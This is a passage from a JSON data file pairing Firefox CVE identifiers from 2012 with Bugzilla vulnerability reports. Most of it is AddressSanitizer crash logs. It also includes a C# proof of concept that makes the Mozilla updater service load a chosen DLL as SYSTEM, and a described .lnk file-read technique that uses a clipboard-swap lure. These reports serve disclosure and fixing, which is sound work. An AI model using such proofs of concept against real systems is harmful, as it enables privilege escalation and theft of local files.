firefox/aurora/layout/generic/nsAbsoluteContainingBlock.cpp:424 #8 0x7f18b9546006 in nsAbsoluteContainingBlock::Reflow(nsContainerFrame*, nsPresContext*, nsHTMLReflowState const&, unsigned int&, int, int, bool, bool, bool, nsOverflowAreas*) firefox/aurora/layout/generic/nsAbsoluteContainingBlock.cpp:158 #9 0x7f18b95617bb in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsBlockFrame.cpp:1207 #10 0x7f18b95f1b7b in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) firefox/aurora/layout/generic/nsBlockReflowContext.cpp:295 #11 0x7f18b9591a4f in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:3202 #12 0x7f18b95872b6 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:2511 #13 0x7f18b956c871 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/aurora/layout/generic/nsBlockFrame.cpp:2022 #14 0x7f18b955ffcf in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsBlockFrame.cpp:1071 #15 0x7f18b9652fa7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/aurora/layout/generic/nsContainerFrame.cpp:940 #16 0x7f18b9634445 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) firefox/aurora/layout/generic/nsColumnSetFrame.cpp:710 #17 0x7f18b963b6c7 in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsColumnSetFrame.cpp:965 #18 0x7f18b95f1b7b in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) firefox/aurora/layout/generic/nsBlockReflowContext.cpp:295 #19 0x7f18b9591a4f in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:3202 #20 0x7f18b95872b6 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:2511 #21 0x7f18b956c871 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/aurora/layout/generic/nsBlockFrame.cpp:2022 #22 0x7f18b955ffcf in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsBlockFrame.cpp:1071 #23 0x7f18b9652fa7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/aurora/layout/generic/nsContainerFrame.cpp:940 #24 0x7f18b9634445 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) firefox/aurora/layout/generic/nsColumnSetFrame.cpp:710 #25 0x7f18b963b6c7 in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsColumnSetFrame.cpp:965 #26 0x7f18b9652fa7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/aurora/layout/generic/nsContainerFrame.cpp:940 #27 0x7f18b981e4ec in nsCanvasFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsCanvasFrame.cpp:461 #28 0x7f18b9652fa7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/aurora/layout/generic/nsContainerFrame.cpp:940 #29 0x7f18b979c723 in nsHTMLScrollFrame::ReflowScrolledFrame(ScrollReflowState*, bool, bool, nsHTMLReflowMetrics*, bool) firefox/aurora/layout/generic/nsGfxScrollFrame.cpp:559 #30 0x7f18b97a21ba in nsHTMLScrollFrame::ReflowContents(ScrollReflowState*, nsHTMLReflowMetrics const&) firefox/aurora/layout/generic/nsGfxScrollFrame.cpp:659 #31 0x7f18b97a652f in nsHTMLScrollFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsGfxScrollFrame.cpp:900 #32 0x7f18b9652fa7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/aurora/layout/generic/nsContainerFrame.cpp:940 #33 0x7f18b9b72706 in ViewportFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsViewportFrame.cpp:230 #34 0x7f18b92dcb59 in PresShell::DoReflow(nsIFrame*, bool) firefox/aurora/layout/base/nsPresShell.cpp:7608 #35 0x7f18b92d941f in PresShell::ResizeReflowIgnoreOverride(int, int) firefox/aurora/layout/base/nsPresShell.cpp:2036 #36 0x7f18b92da50a in PresShell::ResizeReflow(int, int) firefox/aurora/layout/base/nsPresShell.cpp:1971 #37 0x7f18bc8b1f4a in nsViewManager::DoSetWindowDimensions(int, int) firefox/aurora/view/src/nsViewManager.cpp:243 #38 0x7f18bc8b28ed in nsViewManager::SetWindowDimensions(int, int) firefox/aurora/view/src/nsViewManager.cpp:263 #39 0x7f18b912d7f1 in DocumentViewerImpl::SetBounds(nsIntRect const&) firefox/aurora/layout/base/nsDocumentViewer.cpp:1928 #40 0x7f18c01e6cec in nsDocShell::SetPositionAndSize(int, int, int, int, bool) firefox/aurora/docshell/base/nsDocShell.cpp:4739 #41 0x7f18c01e73a7 in non-virtual thunk to nsDocShell::SetPositionAndSize(int, int, int, int, bool) firefox/aurora/modules/zlib/src/gzlib.c:0 #42 0x7f18bac83ba1 in nsFrameLoader::UpdateBaseWindowPositionAndSize(nsIFrame*) firefox/aurora/content/base/src/nsFrameLoader.cpp:1699 #43 0x7f18bac8310e in nsFrameLoader::UpdatePositionAndSize(nsIFrame*) firefox/aurora/content/base/src/nsFrameLoader.cpp:1672 #44 0x7f18b9a25d35 in nsSubDocumentFrame::ReflowFinished() firefox/aurora/layout/generic/nsSubDocumentFrame.cpp:648 #45 0x7f18b9a25ebc in non-virtual thunk to nsSubDocumentFrame::ReflowFinished() firefox/aurora/modules/zlib/src/gzlib.c:0 #46 0x7f18b9307109 in PresShell::HandlePostedReflowCallbacks(bool) firefox/aurora/layout/base/nsPresShell.cpp:3840 #47 0x7f18b92de439 in PresShell::DidDoReflow(bool) firefox/aurora/layout/base/nsPresShell.cpp:7448 #48 0x7f18b92d9452 in PresShell::ResizeReflowIgnoreOverride(int, int) firefox/aurora/layout/base/nsPresShell.cpp:2040 #49 0x7f18b92da50a in PresShell::ResizeReflow(int, int) firefox/aurora/layout/base/nsPresShell.cpp:1971 #50 0x7f18bc8b1f4a in nsViewManager::DoSetWindowDimensions(int, int) firefox/aurora/view/src/nsViewManager.cpp:243 #51 0x7f18bc8b28ed in nsViewManager::SetWindowDimensions(int, int) firefox/aurora/view/src/nsViewManager.cpp:263 #52 0x7f18bc8bb81d in nsViewManager::DispatchEvent(nsGUIEvent*, nsIView*, nsEventStatus*) firefox/aurora/view/src/nsViewManager.cpp:680 #53 0x7f18bc8a5164 in HandleEvent(nsGUIEvent*) firefox/aurora/view/src/nsView.cpp:159 #54 0x7f18c19d195a in nsWindow::DispatchEvent(nsGUIEvent*, nsEventStatus&) firefox/aurora/widget/gtk2/nsWindow.cpp:523 #55 0x7f18c19d0cda in nsWindow::DispatchResizeEvent(nsIntRect&, nsEventStatus&) firefox/aurora/widget/gtk2/nsWindow.cpp:481 #56 0x7f18c19e30c3 in nsWindow::Resize(int, int, int, int, bool) firefox/aurora/widget/gtk2/nsWindow.cpp:1178 #57 0x7f18b912d58b in DocumentViewerImpl::SetBounds(nsIntRect const&) firefox/aurora/layout/base/nsDocumentViewer.cpp:1921 #58 0x7f18c01e6cec in nsDocShell::SetPositionAndSize(int, int, int, int, bool) firefox/aurora/docshell/base/nsDocShell.cpp:4739 #59 0x7f18c01e73a7 in non-virtual thunk to nsDocShell::SetPositionAndSize(int, int, int, int, bool) firefox/aurora/modules/zlib/src/gzlib.c:0 #60 0x7f18c0703e4b in nsWebShellWindow::HandleEvent(nsGUIEvent*) firefox/aurora/xpfe/appshell/src/nsWebShellWindow.cpp:347 #61 0x7f18c19d195a in nsWindow::DispatchEvent(nsGUIEvent*, nsEventStatus&) firefox/aurora/widget/gtk2/nsWindow.cpp:523 #62 0x7f18c19d0cda in nsWindow::DispatchResizeEvent(nsIntRect&, nsEventStatus&) firefox/aurora/widget/gtk2/nsWindow.cpp:481 #63 0x7f18c19fdd4b in nsWindow::OnSizeAllocate(_GtkWidget*, _GdkRectangle*) firefox/aurora/widget/gtk2/nsWindow.cpp:2423 0x7f188f6581b4 is located 20 bytes to the right of 32-byte region [0x7f188f658180,0x7f188f6581a0) allocated by thread T0 here: #0 0x4a4332 in malloc ??:0 #1 0x7f18cf2747c7 in moz_xmalloc firefox/aurora/memory/mozalloc/mozalloc.cpp:87 #2 0x7f18b95a26fb in nsBlockFrame::PushLines(nsBlockReflowState&, nsLineList_iterator) firefox/aurora/layout/generic/nsBlockFrame.cpp:4410 #3 0x7f18b95b1d2c in nsBlockFrame::PlaceLine(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFloatManager::SavedState*, nsRect&, int&, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:4321 #4 0x7f18b95a837e in nsBlockFrame::DoReflowInlineFrames(nsBlockReflowState&, nsLineLayout&, nsLineList_iterator, nsFlowAreaRect&, int&, nsFloatManager::SavedState*, bool*, LineReflowStatus*, bool) firefox/aurora/layout/generic/nsBlockFrame.cpp:3760 #5 0x7f18b9598f47 in nsBlockFrame::ReflowInlineFrames(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:3478 #6 0x7f18b958775c in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:2567 #7 0x7f18b956fbea in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/aurora/layout/generic/nsBlockFrame.cpp:2307 #8 0x7f18b955ffcf in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsBlockFrame.cpp:1071 #9 0x7f18b95f1b7b in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) firefox/aurora/layout/generic/nsBlockReflowContext.cpp:295 #10 0x7f18b9591a4f in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:3202 #11 0x7f18b95872b6 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:2511 #12 0x7f18b956c871 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/aurora/layout/generic/nsBlockFrame.cpp:2022 #13 0x7f18b955ffcf in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsBlockFrame.cpp:1071 #14 0x7f18b9652fa7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/aurora/layout/generic/nsContainerFrame.cpp:940 #15 0x7f18b9634445 in nsColumnSetFrame::ReflowChildren(nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&, nsColumnSetFrame::ReflowConfig const&, bool, nsCollapsingMargin*, nsColumnSetFrame::ColumnBalanceData&) firefox/aurora/layout/generic/nsColumnSetFrame.cpp:710 #16 0x7f18b963b6c7 in nsColumnSetFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsColumnSetFrame.cpp:965 #17 0x7f18b95f1b7b in nsBlockReflowContext::ReflowBlock(nsRect const&, bool, nsCollapsingMargin&, int, bool, nsLineBox*, nsHTMLReflowState&, unsigned int&, nsBlockReflowState&) firefox/aurora/layout/generic/nsBlockReflowContext.cpp:295 #18 0x7f18b9591a4f in nsBlockFrame::ReflowBlockFrame(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:3202 #19 0x7f18b95872b6 in nsBlockFrame::ReflowLine(nsBlockReflowState&, nsLineList_iterator, bool*) firefox/aurora/layout/generic/nsBlockFrame.cpp:2511 #20 0x7f18b956c871 in nsBlockFrame::ReflowDirtyLines(nsBlockReflowState&) firefox/aurora/layout/generic/nsBlockFrame.cpp:2022 #21 0x7f18b955ffcf in nsBlockFrame::Reflow(nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, unsigned int&) firefox/aurora/layout/generic/nsBlockFrame.cpp:1071 #22 0x7f18b9652fa7 in nsContainerFrame::ReflowChild(nsIFrame*, nsPresContext*, nsHTMLReflowMetrics&, nsHTMLReflowState const&, int, int, unsigned int, unsigned int&, nsOverflowContinuationTracker*) firefox/aurora/layout/generic/nsContainerFrame.cpp:940 ==27281== ABORTING Stats: 140M malloced (154M for red zones) by 338742 calls Stats: 42M realloced by 19009 calls Stats: 118M freed by 232563 calls Stats: 0M really freed by 0 calls Stats: 328M (84015 full pages) mmaped in 82 calls mmaps by size class: 8:278511; 9:49146; 10:16380; 11:16376; 12:3072; 13:2048; 14:1536; 15:384; 16:576; 17:128; 18:112; 19:56; 20:16; mallocs by size class: 8:255876; 9:45163; 10:15510; 11:15570; 12:2378; 13:1737; 14:1416; 15:299; 16:521; 17:108; 18:100; 19:50; 20:14; frees by size class: 8:164067; 9:36673; 10:13283; 11:13080; 12:1703; 13:1568; 14:1236; 15:256; 16:456; 17:95; 18:89; 19:46; 20:11; rfrees by size class: Stats: malloc large: 272 small slow: 1772 Shadow byte and word: 0x1fe311ecb036: fb 0x1fe311ecb030: 00 00 00 00 fb fb fb fb More shadow bytes: 0x1fe311ecb010: 00 00 00 00 00 00 00 fb 0x1fe311ecb018: fb fb fb fb fb fb fb fb 0x1fe311ecb020: fa fa fa fa fa fa fa fa 0x1fe311ecb028: fa fa fa fa fa fa fa fa =>0x1fe311ecb030: 00 00 00 00 fb fb fb fb 0x1fe311ecb038: fb fb fb fb fb fb fb fb 0x1fe311ecb040: fa fa fa fa fa fa fa fa 0x1fe311ecb048: fa fa fa fa fa fa fa fa 0x1fe311ecb050: fa fa fa fa fa fa fa fa"
      }
    ],
    "CVE-2012-1942": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=748764",
        "title": "Possible Arbitrary Code Execution by Update Service",
        "description": "Hi, I notice two security issues in the new Mozilla updater service which came with FF12 on Windows I would like to report. a) The service path is not quoted which means you can end up with the potential for a planting attack (e.g. if you can create C:\\Program.exe it will run it when starting the service). b) The service itself can be tricked into loading a DLL into the process with SYSTEM privileges and it will run its DLLMain (meaning you can do anything you like). You call LoadLibrary instead of LoadLibraryEx on line 329 of workmonitor.cpp when checking that you have the correct resource string. It should be called to only load it as a resource. The following C# code will run the service and will load a DLL as long as the files C:\\sourcecode\\exploitme.dll and C:\\sourcecode\\updater.exe are the same. The DLL can then in DllMain run something like CreateProcess. using System; using System.ServiceProcess; namespace FFService { class Program { static void Main(string[] args) { try { ServiceController c = new ServiceController(\"MozillaMaintenance\"); c.Start(new string[] { \"aaa\", \"software-update\", \"C:\\\\sourcecode\\\\exploitme.dll\", \"aaaa\", \"c:\\\\sourcecode\\\\\", \"cccc\" }); } catch (Exception e) { Console.WriteLine(e); } } } } I have only tested in XP Pro SP3 but I assume it will work on Win7 and Vista just the same. If you need more information let me know. James Forshaw Principal Security Consultant Context Information Security Registered no: 3574635 | Certified to ISO/IEC 27001:2005 (BSI Certificate IS 553326) and ISO 9001:2008 (BSI Certificate FS 581360) www.contextis.com | 30 Marsh Wall, London E14 9TP, UK | Mob: +44 (0)7827 248760 | Tel:Ã 0207 537 7515 | Fax: 0207 537 1071 The information contained in this email and any attachments may be legally privileged and confidential.Ã If you are not the intended recipient you are notified that disclosing, copying, distributing or taking any action in reliance on the contents of this information is strictly prohibited.Ã If you are not the intended recipient please contact us immediately.Ã Any views or opinions presented in this email are solely those of the author and do not necessarily represent those of the company."
      }
    ],
    "CVE-2012-1944": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=751422",
        "title": "<img onerror=\"...\"> execute even when inline scripts are blocked by CSP",
        "description": "See http://dvcs.w3.org/hg/webappsec/file/tip/tests/csp/submitted/webkit/CSP_default-src-inline-allowed.php I also reported this in person at the W3C WebAppSec working group face-to-face."
      }
    ],
    "CVE-2012-1945": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=670514",
        "title": "Arbitrary File + Directory read via .lnk files on Windows Share",
        "description": "If a user can be persuaded to visit an HTML file hosted on a public Windows share (see below) then that page can use .lnk files to read arbitrary files and directory listings from their machine. Imagine we have index.html and foo.lnk in the same directory, with foo.lnk pointing to C:\\boot.ini. The HTML file is loaded via a file URL then loads foo.link into an iframe. The contents of boot.ini are displayed but document.location of the iframe is still foo.lnk. However, if the outer page tries to access the iframe, it gets a permission denied error as Firefox still seems to realise that the outer page and inner page are from different origins/directories. The trick is to have two link files: baz.lnk -> index.html foo.lnk -> C:\\boot.ini First we load baz.lnk, then replace baz.lnk with foo.lnk. The HTML page then loads baz.lnk (i.e. itself) using XHR or an iframe. Because the url of the requesting page matches the page loaded, Firefox assumes they're the same origin and allows the contents to be read. Both files and directories can be read in this manner. My PoC uses static .lnk files to read some system directories and the Firefox profile.ini file. However it would be possible to traverse the whole filesystem by grabbing a directory listing and then dynamically generating .lnk files on the server. There are various method to get the user to load content from a public share (e.g. file://///myhost.com/share/index.html): 1. Use a Java applet to force a drop of the URL (see bug 546909) - PoC uses this 2. Put an innocent looking unhyperlinked HTTP url on the page and get the user to copy/paste it into the location bar. When the user has selected the URL, sneakily change the current selection to the file: URL so that gets copied instead (PoC also has this as an alternative option) 3. Possibly send the file URL in an email. I've not really looked into this, but I seem to recall Outlook will open up \\\\myhost.com\\share\\index.html in Firefox if it's the default browser. This attack could either work within an intranet or possibly over the internet providing your ISP/Corporate firewall doesn't block the relevant ports. My ISP does, but I know not all do. I've attached the PoC as a zip file, as I don't currently have anywhere to host this publically. It's been tested on a few Windows XP machines, not sure if Win7 has any extra security measures to prevent things like this. Finally, this bug was found in my own time, so I promise it won't be blogged, tweeted or publicised in any way before it's fixed."
      }
    ],
    "CVE-2012-1946": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=750109",
        "title": "Use-after-free in nsINode::ReplaceOrInsertBefore",
        "description": "Use-after-free is triggered during replacing/inserting node in document. Crashes on: - 14.0a1 (Ubuntu 11.11, Linux x86-64), - 15.0a1 (Windows 7, x86-64), - 12.0 (Windows XP SP3). Does not crash on 10.0.2. Attached test-case is a bit flaky, but it will crash browser after 2-5 reloads. ASan log is from version 14.0a1."
      }
    ],
    "CVE-2012-1947": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=744541",
        "title": "Heap-buffer-overflow in utf16_to_isolatin1",
        "description": "User Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/535.11 (KHTML, like Gecko) Chrome/17.0.963.83 Safari/535.11 Steps to reproduce: I ran the attached testcase on ASANified Firefox Beta 12.0 and Firefox Aurora 13.0a2 and got this crash. The testcase reproduces reliably on slower bots. ================================================================= ==22842== ERROR: AddressSanitizer heap-buffer-overflow on address 0x7f3963484b86 at pc 0x7f397f1c4155 bp 0x7fff6ca8a7a0 sp 0x7fff6ca8a798 READ of size 2 at 0x7f3963484b86 thread T0 #0 0x7f397f1c4155 in utf16_to_isolatin1 firefox/beta-src/xpcom/io/nsNativeCharsetUtils.cpp:123 #1 0x7f397f1c470e in NS_CopyUnicodeToNative(nsAString_internal const&, nsACString_internal&) firefox/beta-src/xpcom/io/nsNativeCharsetUtils.cpp:865 #2 0x7f397f1e2acf in nsLocalFile::InitWithPath(nsAString_internal const&) firefox/beta-src/xpcom/io/nsLocalFileUnix.cpp:1968 #3 0x7f397d3c6345 in net_GetFileFromURLSpec(nsACString_internal const&, nsIFile**) firefox/beta-src/netwerk/base/src/nsURLHelperUnix.cpp:121 #4 0x7f397d39dfed in nsStandardURL::EnsureFile() firefox/beta-src/netwerk/base/src/nsStandardURL.cpp:2546 #5 0x7f397d39e06f in nsStandardURL::GetFile(nsIFile**) firefox/beta-src/netwerk/base/src/nsStandardURL.cpp:2553 #6 0x7f397d463c2f in nsFileChannel::OpenContentStream(bool, nsIInputStream**, nsIChannel**) firefox/beta-src/netwerk/protocol/file/nsFileChannel.cpp:315 #7 0x7f397d349de0 in nsBaseChannel::BeginPumpingData() firefox/beta-src/netwerk/base/src/nsBaseChannel.cpp:240 #8 0x7f397d34bd59 in nsBaseChannel::AsyncOpen(nsIStreamListener*, nsISupports*) firefox/beta-src/netwerk/base/src/nsBaseChannel.cpp:609 #9 0x7f397dcf38e9 in nsScriptLoader::StartLoad(nsScriptLoadRequest*, nsAString_internal const&) firefox/beta-src/content/base/src/nsScriptLoader.cpp:339 #10 0x7f397dcf9bb9 in nsScriptLoader::PreloadURI(nsIURI*, nsAString_internal const&, nsAString_internal const&) firefox/beta-src/content/base/src/nsScriptLoader.cpp:1340 #11 0x7f397e3a02a2 in nsHtml5TreeOpExecutor::PreloadScript(nsAString_internal const&, nsAString_internal const&, nsAString_internal const&) firefox/beta-src/parser/html/nsHtml5TreeOpExecutor.cpp:940 #12 0x7f397e3aa949 in nsHtml5SpeculativeLoad::Perform(nsHtml5TreeOpExecutor*) firefox/beta-src/parser/html/nsHtml5SpeculativeLoad.cpp:67 #13 0x7f397e39ea54 in nsHtml5TreeOpExecutor::RunFlushLoop() firefox/beta-src/parser/html/nsHtml5TreeOpExecutor.cpp:478 #14 0x7f397e3aa2f2 in nsHtml5ExecutorFlusher::Run() firefox/beta-src/parser/html/nsHtml5StreamParser.cpp:160 #15 0x7f397f165d7d in NS_ProcessNextEvent_P(nsIThread*, bool) firefox/beta-src/objdir-ff-asan/xpcom/build/nsThreadUtils.cpp:245 #16 0x7f397efe5b25 in mozilla::ipc::MessagePump::Run(base::MessagePump::Delegate*) firefox/beta-src/ipc/glue/MessagePump.cpp:110 #17 0x7f397f26bccf in MessageLoop::Run() firefox/beta-src/ipc/chromium/src/base/message_loop.cc:176 #18 0x7f397edf3acc in nsBaseAppShell::Run() firefox/beta-src/widget/xpwidgets/nsBaseAppShell.cpp:191 #19 0x407982 in do_main firefox/beta-src/browser/app/nsBrowserApp.cpp:205 #20 0x40707a in main firefox/beta-src/browser/app/nsBrowserApp.cpp:295 #21 0x7f3984550c4d in __libc_start_main /build/buildd/eglibc-2.11.1/csu/libc-start.c:258 0x7f3963484b86 is located 0 bytes to the right of 262-byte region [0x7f3963484a80,0x7f3963484b86) allocated by thread T0 here: #0 0x4103e2 in malloc #1 0x7f397f234a9d in nsStringBuffer::Alloc(unsigned long) firefox/beta-src/xpcom/string/src/nsSubstring.cpp:209 #2 0x7f397f237467 in nsAString_internal::SetCapacity(unsigned int) firefox/beta-src/xpcom/string/src/nsTSubstring.cpp:549 #3 0x7f397f235b9d in nsAString_internal::SetLength(unsigned int) firefox/beta-src/xpcom/string/src/nsTSubstring.cpp:579 ==22842== ABORTING Stats: 98M malloced (100M for red zones) by 213591 calls Stats: 5M realloced by 10131 calls Stats: 68M freed by 115413 calls Stats: 0M really freed by 0 calls Stats: 220M (56351 full pages) mmaped in 55 calls mmaps by size class: 8:180213; 9:32764; 10:12285; 11:12282; 12:2048; 13:1536; 14:1280; 15:256; 16:512; 17:128; 18:64; 19:8; 20:4; 21:2; mallocs by size class: 8:159655; 9:26841; 10:10317; 11:11443; 12:1809; 13:1402; 14:1249; 15:204; 16:479; 17:123; 18:57; 19:6; 20:4; 21:2; frees by size class: 8:75941; 9:18459; 10:7803; 11:9347; 12:1445; 13:636; 14:1116; 15:170; 16:364; 17:115; 18:11; 19:4; 20:2; rfrees by size class: Stats: malloc large: 192 small slow: 1306 Shadow byte and word: 0x1fe72c690970: 6 0x1fe72c690970: 06 fb fb fb fb fb fb fb More shadow bytes: 0x1fe72c690950: 00 00 00 00 00 00 00 00 0x1fe72c690958: 00 00 00 00 00 00 00 00 0x1fe72c690960: 00 00 00 00 00 00 00 00 0x1fe72c690968: 00 00 00 00 00 00 00 00 =>0x1fe72c690970: 06 fb fb fb fb fb fb fb 0x1fe72c690978: fb fb fb fb fb fb fb fb 0x1fe72c690980: fa fa fa fa fa fa fa fa 0x1fe72c690988: fa fa fa fa fa fa fa fa 0x1fe72c690990: fa fa fa fa fa fa fa fa"
      }
    ],
    "CVE-2012-1951": [
      {
        "url": "https://bugzilla.mozilla.org/show_bug.cgi?id=752902",
        "title": "Heap-use-after-free in nsSMILTimeValueSpec::IsEventBased",
        "description": "Affects latest Aurora, Trunk ================================================================= ==26824== ERROR: AddressSanitizer heap-use-after-free on address 0x7f6d5ecb0b90 at pc 0x7f6d8e48de39 bp 0x7ffff4b4ca70 sp 0x7ffff4b4ca68 READ of size 4 at 0x7f6d5ecb0b90 thread T0 #0 0x7f6d8e48de39 in nsSMILTimeValueSpec::IsEventBased() const firefox/aurora/content/smil/nsSMILTimeValueSpec.cpp:171 #1 0x7f6d8e473023 in nsSMILTimedElement::EndHasEventConditions() const firefox/aurora/content/smil/nsSMILTimedElement.cpp:2291 #2 0x7f6d8e45b1f7 in nsSMILTimedElement::GetNextInterval(nsSMILInterval const*, nsSMILInterval const*, nsSMILInstanceTime const*, nsSMILInterval&) const firefox/aurora/content/smil/nsSMILTimedElement.cpp:1696 #3 0x7f6d8e454302 in nsSMILTimedElement::UpdateCurrentInterval(bool) firefox/aurora/content/smil/nsSMILTimedElement.cpp:1998 #4 0x7f6d8e4569f9 in nsSMILTimedElement::RemoveInstanceTimesForCreator(nsSMILTimeValueSpec const*, bool) firefox/aurora/content/smil/nsSMILTimedElement.cpp:484 #5 0x7f6d8e48c069 in nsSMILTimeValueSpec::UnregisterFromReferencedElement(mozilla::dom::Element*) firefox/aurora/content/smil/nsSMILTimeValueSpec.cpp:307 #6 0x7f6d8e48bcb2 in ~nsSMILTimeValueSpec firefox/aurora/content/smil/nsSMILTimeValueSpec.cpp:93 #7 0x7f6d8e481942 in ~nsAutoPtr firefox/aurora/../../dist/include/nsAutoPtr.h:105 #8 0x7f6d8e46cf13 in ~nsAutoPtr firefox/aurora/../../dist/include/nsAutoPtr.h:106 #9 0x7f6d8e480913 in nsTArrayElementTraits<nsAutoPtr<nsSMILTimeValueSpec> >::Destruct(nsAutoPtr<nsSMILTimeValueSpec>*) firefox/aurora/../../dist/include/nsTArray.h:381 #10 0x7f6d8e480578 in nsTArray<nsAutoPtr<nsSMILTimeValueSpec>, nsTArrayDefaultAllocator>::DestructRange(unsigned int, unsigned int) firefox/aurora/../../dist/include/nsTArray.h:1242 #11 0x7f6d8e480007 in nsTArray<nsAutoPtr<nsSMILTimeValueSpec>, nsTArrayDefaultAllocator>::RemoveElementsAt(unsigned int, unsigned int) firefox/aurora/../../dist/include/nsTArray.h:964 #12 0x7f6d8e46d03f in nsTArray<nsAutoPtr<nsSMILTimeValueSpec>, nsTArrayDefaultAllocator>::Clear() firefox/aurora/../../dist/include/nsTArray.h:975 #13 0x7f6d8e46825c in nsSMILTimedElement::ClearSpecs(nsTArray<nsAutoPtr<nsSMILTimeValueSpec>, nsTArrayDefaultAllocator>&, nsTArray<nsRefPtr<nsSMILInstanceTime>, nsTArrayDefaultAllocator>&, bool (*)(nsSMILInstanceTime*)) firefox/aurora/content/smil/nsSMILTimedElement.cpp:1331 #14 0x7f6d8e4611a0 in nsSMILTimedElement::UnsetEndSpec(bool (*)(nsSMILInstanceTime*)) firefox/aurora/content/smil/nsSMILTimedElement.cpp:904 #15 0x7f6d8e465f36 in nsSMILTimedElement::UnsetAttr(nsIAtom*) firefox/aurora/content/smil/nsSMILTimedElement.cpp:854 #16 0x7f6d8e337423 in nsSVGAnimationElement::UnsetAttr(int, nsIAtom*, bool) firefox/aurora/content/svg/content/src/nsSVGAnimationElement.cpp:411 #17 0x7f6d8a157d03 in 